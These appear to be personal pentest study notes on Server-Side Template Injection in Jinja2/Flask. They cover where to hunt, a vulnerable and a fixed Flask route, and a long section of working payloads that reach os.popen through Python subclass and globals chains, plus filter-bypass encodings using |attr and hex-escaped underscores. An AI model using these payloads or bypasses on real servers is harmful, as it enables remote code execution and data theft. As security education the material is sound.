## what is SSTI


	├── Definition
	│   ├── Server-Side Template Injection occurs when user input is injected into a template engine
	│   ├── Template engines render dynamic HTML or content using templates
	│   ├── Vulnerable apps pass untrusted input to template engine
	│   ├── No proper sanitization or escaping of input
	│   └── Can lead to code execution if template engine allows it
	├── Impact
	│   ├── Execution of arbitrary template expressions
	│   ├── Arbitrary code execution (Python, PHP, Ruby, etc.)
	│   ├── Read sensitive files (config files, credentials)
	│   ├── Modify internal server state
	│   ├── Remote shell if engine supports OS interaction
	│   ├── Leak environment variables
	│   └── Pivot to other attacks (DB access, RCE)
	├── Common Template Engines
	│   ├── Jinja2 (Python)
	│   ├── Twig (PHP)
	│   ├── Freemarker (Java)
	│   ├── Velocity (Java)
	│   ├── Django Templates (Python)
	│   └── Liquid (Ruby)
	├── Types of SSTI
	│   ├── Expression Injection: {{user_input}}
	│   ├── Statement Injection: {% code %} in Jinja/Twig
	│   ├── Variable Access: access internal objects
	│   └── Function Execution: call built-in functions from input
	└── Prerequisites
	    ├── Application uses server-side templates
	    ├── User input reflected in template
	    ├── No proper escaping/filtering
	    ├── Engine supports dynamic code evaluation
	    └── Knowledge of template engine syntax increases success




## where to find ssti 

	SSTI Hunting
	├── Input Reflection Points
	│   ├── User profile pages (name, bio, description)
	│   ├── Feedback / comments
	│   ├── Message boards / forums
	│   └── Contact forms / support pages
	├── Dynamic Content Pages
	│   ├── Search endpoints
	│   ├── PDF generators / report generation
	│   ├── Email templates (welcome, notification)
	│   └── Admin dashboards
	├── Template Engine Clues
	│   ├── Jinja2: {{ }}, {% %}, {{7*7}}
	│   ├── Twig: {{ }}, {% %}, {{7*7}}
	│   ├── Freemarker: ${}, <#...>
	│   ├── Django: {{ }}, {% %}, {{7*7}}
	│   └── Liquid: {{ }}, {% %}, {{7*7}}
	├── API Endpoints
	│   ├── JSON endpoints reflecting input
	│   ├── XML endpoints
	│   └── HTTP headers reflected in response
	├── Third-Party Plugins
	│   └── CMS plugins rendering templates from input
	└── Old / Legacy Pages
	    ├── Report generators
	    ├── Upload / convert scripts
	    ├── Admin-only pages
	    └── Deprecated endpoints


## source code (before&after)
	
	# app_vuln.py
	from flask import Flask, request, render_template_string
	app = Flask(__name__)
	
	@app.route('/preview', methods=['POST'])
	def preview():
	    # user supplies full template body
	    tpl = request.form.get('template')     # DANGER: user-controlled template
	    return render_template_string(tpl) # RENDERING USER INPUT DIRECTLY ->SSTI


	------after-------
	
		# app_fixed_whitelist.py
	from flask import Flask, request, render_template
	import html
	
	app = Flask(__name__)
	
	\# server-managed template file (templates/email.html)
	# content example: "Hello {{ username }}, your order {{ order_id }} isready."
	
	@app.route('/preview_safe', methods=['POST'])
	def preview_safe():
	    # Accept only simple token values from user, never templates
	    username = request.form.get('username', 'Guest')
	    order_id = request.form.get('order_id', 'N/A')
	
	    # escape values to avoid HTML injection
	    safe_username = html.escape(username)
	    safe_order_id = html.escape(order_id)
	
	    # render server-side template file with safe variables only
	    return render_template('email.html', username=safe_username, 
	    order_id=safe_order_id)




# how to detect 

the flow: object / dict / module / callable
	- how to test and detect :
		1- start with calculate any num like 5* 5 in templatejinja2 -> {{5 *  5}}	
		2- then try to see the configration {{config}}
		3- how many class running now ->
		 "".__class__.__base__.__subclasses__().__len__()
		4- what is the name of the class "brute-force" ->  
		   "".__class__.__base__.__subclasses__()[33].__name__		 
		5- "".__class__.__base__.__subclasses__()[THE-INDEX-YOU-FOUND] 
		 .__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()
	#- or use 
		1- "".__class__.__mro__[1].__subclasses__() to show all class 
		2- send all to AI to show the subclass you need and his index 'll run os
		3- after got the index will run init built -> 
		 {{"".__class__.__mro__[1].__subclasses__()[282].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}   | NOte: try all possible index 
		 
	#- OR The best one  
		{{config.__class__.__init__.__globals__['os'].popen('ls').read()}} but 
		with our encode -> {{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}} 
	# getitem It is an alternative to the square brackets []

	Tips :
		in flask the func render_template() by default import request object so 
		you can do that : {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
# payload & bypass

	



 - {{ (request is defined) and request.method }} in janja2 to know is request i exist 

- bypass: 
	1- how to bypass . dot -> |attr() which is part of jinja2 template engine
	2- how to bypass __  -> encode it with hex why hex not base64  or any encode  'cause the template engine  process it by default but if you wanna use base64 or anything else you can by  import them   __   (with hex to template  engine render it)
	
	 
	
		payload: request.application.__globals__['__builtins__']['__import__']
		('os').popen('ls').read()

		with encode: 
		{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
	 
 


	ere’s the same **safe, step‑by‑step SSTI probing workflow** translated to English — short, actionable, and ready to paste into a template to run in your lab.
	
	1. `{{ (request is defined) }}` → Is `request` present? (True / False)
	    
	2. `{{ request|attr('application')|default('NO') }}` → Is `application` available on `request`?
	    
	3. `{{ request|attr('application')|attr('__class__').__name__|default('NO') }}` → What is the `application`’s class name?
	    
	4. `{{ request|attr('application')|attr('__globals__')|default('NO') }}` → Are `__globals__` visible? (returns `NO` if not)
	    
	5. If visible: `{{ request|attr('application')|attr('__globals__').keys()|list[:20] }}` → List the keys in `__globals__` (first 20).
	    
	6. If there is `__builtins__`: `{{ request|attr('application')|attr('__globals__')['__builtins__']|default('NO') }}` → Check its type (dict or module).
	    
	7. Then test `__import__` safely (obfuscate names if needed). Prefer non-destructive calls, e.g.:  
	    `{{ request|attr('application')|attr('__globals__')['__built' + 'ins__']['__im' + 'port__']('os').getcwd() }}`  
	    or `{{ request|attr('application')|attr('__globals__')['__builtins__'].__import__('os').getcwd() }}` depending on type
